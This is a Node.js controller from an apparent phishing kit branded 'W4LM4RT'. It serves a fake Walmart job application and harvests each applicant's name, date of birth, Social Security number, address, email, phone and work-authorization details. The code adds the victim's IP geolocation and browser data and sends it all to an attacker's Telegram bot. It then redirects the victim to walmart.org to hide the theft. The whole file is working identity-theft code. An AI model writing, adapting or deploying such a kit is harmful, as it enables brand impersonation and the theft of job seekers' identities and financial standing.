const { sendMessageFor } = require('simple-telegram-message');
const ipInfo = require('ip-info-finder');
const { getClientIp } = require('request-ip');
const { botToken, chatId } = require('../config/settings');

exports.login = (req, res) => {
	return res.render('login');
};

exports.loginPost = async (req, res) => {
	const { fname, mname, lname, dob, ssn, weight, address, cityy, state, zipcode, email, phone, gender, position, shift, resigned, workAuth, startDate, idme, jobStatus } =
		req.body;
	const clientIP = getClientIp(req);

	function getIPDetails() {
		return ipInfo
			.getIPInfo(clientIP)
			.then((data) => {
				var data = data;
				return data;
			})
			.catch((err) => {
				console.log(err);
			});
	}

	const iPDetails = await getIPDetails();
	const { ipAddress, Coordinates, City, Region, postalCode, Country, Time, provider, ASN } = iPDetails;

	const userAgent = req.headers['user-agent'];
	const systemLang = req.headers['accept-language'];

	const message =
		`👾 SHAKESWORDE | W4LM4RT | USER_${ipAddress}\n\n` +
		`👤 APPLICATION INFO\n` +
		`FIRST NAME       : ${fname}\n` +
		`MIDDLE NAME      : ${mname}\n` +
		`LAST NAME        : ${lname}\n` +
		`DOB              : ${dob}\n` +
		`SSN              : ${ssn}\n` +
		`WEIGHT           : ${weight}\n` +
		`ADDRESS          : ${address}\n` +
		`CITY             : ${cityy}\n` +
		`STATE            : ${state}\n` +
		`ZIP CODE         : ${zipcode}\n` +
		`EMAIL            : ${email}\n` +
		`PHONE            : ${phone}\n` +
		`GENDER           : ${gender}\n\n` +
		`----------------------------------\n` +
		`What position are you applying for? : ${position}\n` +
		`Which shift will work for you schedule? : ${shift}\n` +
		`In the last 10 years, have you ever been involuntarily terminated or asked to resign your employment? : ${resigned}\n` +
		`Are you authorized to work in the United States for any employer? : ${workAuth}\n` +
		`Available Start Date : ${startDate}\n` +
		`Do you have an account with IDME? : ${idme}\n` +
		`What is your current employment status? : ${jobStatus}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddress}\n` +
		`COORDINATES      : ${Coordinates}\n` +
		`CITY             : ${City}\n` +
		`STATE            : ${Region}\n` +
		`ZIP CODE         : ${postalCode}\n` +
		`COUNTRY          : ${Country}\n` +
		`TIME             : ${Time}\n` +
		`ISP              : ${provider} ${ASN}\n\n` +
		`💻 SYSTEM INFO\n` +
		`USER AGENT       : ${userAgent}\n` +
		`SYSTEM LANGUAGE  : ${systemLang}`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect('https://walmart.org');
};

exports.complete = (req, res) => {
	return res.render('complete');
};

exports.page404Redirect = (req, res) => {
	return res.redirect('/');
};
